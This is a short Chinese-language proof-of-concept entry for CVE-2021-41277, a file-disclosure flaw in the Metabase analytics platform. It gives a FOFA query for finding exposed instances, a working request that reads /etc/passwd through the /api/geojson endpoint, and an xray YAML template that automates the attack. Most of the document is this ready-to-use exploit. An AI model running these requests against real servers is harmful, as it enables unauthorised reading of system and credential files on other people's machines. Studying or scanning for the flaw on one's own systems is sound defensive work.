# CVE-2021-41277 Metabase 信息泄露漏洞

## 漏洞描述

Metabase是美国Metabase公司的一个开源数据分析平台。

Metabase 中存在信息泄露漏洞，该漏洞源于产品的 admin-＞settings-＞maps-＞custom maps-＞add a map 操作缺少权限验证。攻击者可通过该漏洞获得敏感信息。

- CNNVD编号：CNNVD-202111-1565
- 危害等级：超危

- CVE编号：CVE-2021-41277

## FOFA搜索app="Metabase" 

![image](C:/Users/litbaizhang/Desktop/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.assets/image-16461850027541.png)

## POC：{{BaseURL}}/api/geojson?url=file:/etc/passwd

例：

![image (1)](C:/Users/litbaizhang/Desktop/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/Metabase%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.assets/image%20(1)-16461850084782.png)

返回码：200



## xrayPOC

```plain
name: poc-yaml-Metabase-FileInclusio-com
rules:
  - method: GET
    path: '/api/geojson?url=file:/etc/passwd'
    headers:
      User-Agent: >-
        Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
        Trident/5.0)
    follow_redirects: true
    expression: |
      response.status==200
```